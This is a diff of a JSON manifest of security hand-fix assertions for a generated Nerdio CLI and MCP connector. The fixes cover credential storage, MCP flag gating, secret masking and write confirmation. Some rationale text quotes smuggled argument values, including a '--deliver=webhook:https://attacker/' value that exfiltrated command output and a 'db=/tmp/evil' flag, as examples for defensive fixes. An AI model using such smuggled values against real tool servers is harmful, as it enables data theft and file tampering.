@@ -69,34 +69,6 @@
    ]
   },
   {
-   "id": "env-oauth-secrets-not-persisted",
-   "summary": "SaveTokens keeps the env-override marker on ClientID/ClientSecret, so env-supplied OAuth credentials are never written to config.toml (issue #266)",
-   "why": "Load() marks ClientID/ClientSecret as env overrides and configForSave() restores the file value for any field still marked -- the mechanism that keeps env-supplied secrets off disk. SaveTokens() cleared both markers on every save, so each token mint (an ordinary authenticated command, no `auth login` step needed) rewrote the live client_id and client_secret into ~/.config/<tool>-cli/config.toml in cleartext, defeating Keychain/Credential-Manager setups that inject the secret as an env var at process launch. SaveTokens now leaves those two markers alone; only MarkCredentialsExplicit clears them, and only `auth login` calls it, passing whether each value came from a flag rather than from the env fallback. Provenance must be declared, not inferred: comparing the incoming value against the loaded one cannot tell an explicit flag from the env value it duplicates, and `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and leaks. Reported by @Xenith-B against halopsa-cli/ninjaone-cli. GENERATOR-class defect (the press emits the unconditional deletes) tracked for an upstream retro; until the press is fixed, a reprint reintroduces the leak and these markers guard the connector. Bug-fix-only: no new flag, command, or output.",
-   "status": "active",
-   "spec_encode_followup": "DONE UPSTREAM: mvanhorn/cli-printing-press#4393 merged 2026-08-28 (closed #4283 as completed), first shipped press v4.31.2; this hand-fix stays active until a reprint absorbs it; do NOT cite #4283 as open. Encoded there: SaveTokens must not clear the ClientID/ClientSecret env-override markers. Only a credential the caller supplied through an explicit command-line flag may clear them, and the flag's provenance must be passed in by the caller -- NOT inferred by comparing the incoming value against the loaded one. An explicit flag whose value equals the environment's is still explicit and must persist; conversely `auth login` trims its env fallback while Load does not, so a padded variable compares unequal to itself and a value-based rule leaks it.",
-   "asserts": [
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "func (c *Config) MarkCredentialsExplicit(clientID, clientSecret bool) {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/cli/auth.go",
-     "contains": "cfg.MarkCredentialsExplicit(explicitClientID, explicitClientSecret)",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "contains": "markers now survive a save; only MarkCredentialsExplicit clears them.",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/config/config.go",
-     "not_contains": "delete(c.envOverrides, \"ClientID\")\n\tdelete(c.envOverrides, \"ClientSecret\")\n\tdelete(c.envOverrides, \"AccessToken\")"
-    }
-   ]
-  },
-  {
    "id": "doctor-verdict-tracks-reality",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
    "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
@@ -107,7 +79,7 @@
      "contains": "func doctorProbeCredentials("
     },
     {
-     "file": "cli/internal/cli/doctor_verdict.go",
+     "file": "cli/internal/cli/doctor.go",
      "contains": "func doctorBaseURLIsPlaceholder("
     },
     {
@@ -129,6 +101,36 @@
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorProbeCredentials(cmd.Context(), c, cmd.Root(),",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
@@ -217,58 +219,9 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
    "id": "no-config-write-switch",
    "summary": "NERDIO_NO_CONFIG_WRITE makes every credential write a no-op (token cache included) while leaving the `auth logout` erase working, and the MCP server honours it too (issue #270)",
-   "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login` and `auth set-token` REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) newMCPClient now resolves through config.Load(\"\"), the resolver the CLI uses, so the MCP server honours both NERDIO_CONFIG and this switch; that is the half the issue says is uncovered today. The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache.",
+   "why": "Issue #270, raised by @Xenith-B off the back of #266. #266 stopped env-supplied client credentials reaching disk; the MINTED access token still landed in ~/.config/<tool>-cli/config.toml in cleartext and there was no supported way to turn that off. Their workaround was `--config NUL`, which is OS-specific, undocumented, makes doctor report a false 'not configured', and - the part that matters most - does not cover the MCP servers at all, because internal/mcp resolved its own hardcoded config path and ignored --config. Three deliberate boundaries make this switch honest rather than merely quiet. (1) ClearTokens keeps calling save() directly: it is the ERASE path, and routing it through the guard would make `auth logout` silently inert, which is a worse defect than the one being fixed. (2) `auth login` and `auth set-token` REFUSE and name the variable rather than reporting a save that did not happen - a false success is the same defect class as a doctor that says credentials are fine without checking. (3) newMCPClient now resolves through config.Load(\"\"), the resolver the CLI uses, so the MCP server honours both NERDIO_CONFIG and this switch; that is the half the issue says is uncovered today. The variable is declared on all three install channels because for a Claude Desktop install the manifest prompt is the ONLY channel that can set an environment variable. Class C, new documented surface. GENERATOR-class: a reprint drops the switch entirely and silently restores the plaintext token cache. The tests run in the press sandbox (testenv.Isolate): setting only HOME let Windows resolve the credentials file under USERPROFILE, outside the test's snapshot (Windows CI on PR #577).",
    "status": "active",
    "spec_encode_followup": "cli-printing-press should emit <PREFIX>_NO_CONFIG_WRITE (or an equivalent) as part of the standard config surface, with the same three boundaries: the erase path exempt, explicit save commands failing loudly rather than no-oping, and the MCP server resolving its config through config.Load(\"\") instead of a hardcoded home-relative path. The hardcoded path in internal/mcp/tools.go is a generator defect in its own right - it makes --config and <PREFIX>_CONFIG inert for every MCP install on every connector.",
    "asserts": [
@@ -323,11 +276,6 @@
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/mcp_config_resolution_test.go",
-     "contains": "func TestMCPClientHonoursTheConfigEnvVar(",
-     "min_count": 1
-    },
-    {
      "file": "cli/internal/cli/auth.go",
      "contains": "if config.NoConfigWrite() {",
      "min_count": 2
@@ -341,163 +289,33 @@
      "file": "guide.md",
      "contains": "| `auth login` / `auth set-token` | Refuse, naming the variable, instead of reporting a save that did not happen. |",
      "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "file": "cli/internal/config/config.go",
+     "contains": "return c.saveCredentialMaterial()",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "file": "cli/internal/config/config.go",
+     "contains": "func NoConfigWrite() bool {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
+     "file": "cli/internal/cli/auth.go",
+     "contains": "if config.NoConfigWrite() {",
      "min_count": 1,
      "code_only": true
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
+     "file": "cli/internal/config/config_noconfigwrite_test.go",
+     "contains": "testenv.Isolate(t, cliutil.ConfigDir, cliutil.DataDir, cliutil.StateDir, cliutil.CacheDir)",
      "min_count": 1
     },
     {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
+     "file": "cli/internal/config/config_noconfigwrite_test.go",
+     "not_contains": "t.Setenv(\"HOME\""
     }
    ]
   },
@@ -509,12 +327,6 @@
    "status": "active",
    "spec_encode_followup": "Press fix: client.go.tmpl should skip the client-credentials mint when DryRun is set (the dry-run preview already uses cached material only), and auth.go.tmpl's login should honor the root --dry-run flag.",
    "asserts": [
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "if !c.DryRun && needsClientCredentialsMint(c.Config) {",
-     "min_count": 1,
-     "code_only": true
-    },
     {
      "file": "cli/internal/cli/auth.go",
      "contains": "(dry run - no request sent, nothing saved)",
@@ -610,168 +422,996 @@
      "contains": "func TestAuthLoginRefusesATokenRedirectToAnotherOrigin(",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/oauth_token.go",
+     "contains": "if !oauthTokenSameHost(target.Hostname(), origin.Hostname()) {",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
+   "id": "no-response-cache",
    "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the OAuth client-credentials token endpoint's error body; the token refresh endpoint's error body. The `auth login` token exchange (internal/cli/auth.go mintClientCredentialsToken) funnels its error body with the client secret it sent. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "summary": "The on-disk response cache is off on every client: raw Nerdio bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential. c.NoCache = true in guardClient (nerdio_guard.go); TestGuardWrapsTheSessionTransport asserts it. README and SKILL say responses are never cached (tools/apply_docfixes.py). Ported to nerdio from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "c.NoCache = true",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes Nerdio state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/nerdio_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to nerdio from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/mcp/cobratree/nerdio_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/nerdio_confirm_registered_test.go",
+     "contains": "func TestRegisteredMirroredWritesNeedConfirm(t *testing.T) {",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
+     "file": "cli/internal/nerdioblackbox/blackbox_test.go",
+     "contains": "func TestMCPSendsOnlyReadsWithoutConfirm(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "docs-credential-safety",
+   "class": "docs",
+   "summary": "README and SKILL carry a Credential safety section (which host gets which credential, withheld output, 0600 store, dry run, MCP confirm) and no longer promise a five-minute response cache (the cache is off on every client).",
+   "why": "The generated docs describe the press defaults (a response cache) that the credential layer turns off; a reprint restores the false promise and drops the transcripts reasoning the work order requires. Ported to nerdio from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "## Credential safety"
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "cached for five minutes"
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "cached for five minutes"
+    }
+   ]
+  },
+  {
+   "id": "dry-run-sends-nothing",
+   "status": "active",
+   "summary": "A client built under --dry-run refuses every request at its transport, so no write, mint or refresh can reach Nerdio whatever a command does with the client; `auth login --dry-run` sends nothing too.",
+   "why": "Defense in depth beside dry-run-never-mints: the generated preview path returns before sending, and this transport makes a missed branch fail closed. The black-box test runs writes and auth login under --dry-run from a cold start against a fake token host and API host and counts zero requests on both. Ported to nerdio from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the action1 4.34.2 reprint (one credential layer across the fleet). Ported to nerdio from the appdirect 4.34.2 reprint (one credential layer across the fleet).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/nerdio_guard.go",
+     "contains": "inner = dryRunTripper{}",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
+     "file": "cli/internal/nerdioblackbox/blackbox_test.go",
+     "contains": "func TestDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-endpoint-write-confirm",
+   "status": "active",
+   "summary": "Every typed MCP endpoint tool that is not read-only (create or update a company or contact, delete a contact, create an order, update or cancel a subscription) returns a preview of the request and sends nothing until confirm is boolean true; the gate wraps every non-read-only, non-mirrored tool, so one a later print adds is gated too.",
